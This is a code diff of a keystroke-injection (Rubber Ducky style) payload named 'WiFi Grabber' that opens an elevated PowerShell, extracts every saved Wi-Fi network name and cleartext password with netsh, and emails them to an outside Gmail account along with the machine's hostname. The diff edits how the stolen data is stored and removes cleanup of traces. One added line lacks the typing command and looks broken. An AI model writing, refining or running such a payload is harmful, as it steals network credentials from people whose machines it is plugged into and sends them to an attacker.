@@ -7,14 +7,14 @@ ESCAPE
 CONTROL ESCAPE
 DELAY 400
 STRING powershell
-DELAY 400
 CTRL-SHIFT ENTER
 DELAY 400
 ALT y
 
 REM:::Get Profiles and Passwords:::
-STRING $A = (netsh wlan show pro) | sls "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show pro name="$name" key=clear)}  | sls "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize
+STRING (netsh wlan show pro) | sls "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show pro "$name" key=clear)}  | sls "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SSID=$name;PW=$pass }} | ft -AutoSize > temp
 ENTER
+$host=`hostname`
 
 REM:::Email WIFI Info::::
 STRING $SMTPServer = 'smtp.gmail.com'
@@ -31,13 +31,11 @@ STRING $ReportEmail.From = 'ACCOUNT@gmail.com'
 ENTER
 STRING $ReportEmail.To.Add('RECEIVER@gmail.com')
 ENTER
-STRING $ReportEmail.Subject = 'WiFi Grabber'
+STRING $ReportEmail.Subject = "WiFi Grabber for $host"
 ENTER
-STRING $ReportEmail.Body = $A
+STRING $ReportEmail.Body = (Get-Content temp | out-string)
 ENTER
 STRING $SMTPInfo.Send($ReportEmail)
-ENTER
-STRING rm variable:/A
 ENTER
 STRING exit
 ENTER
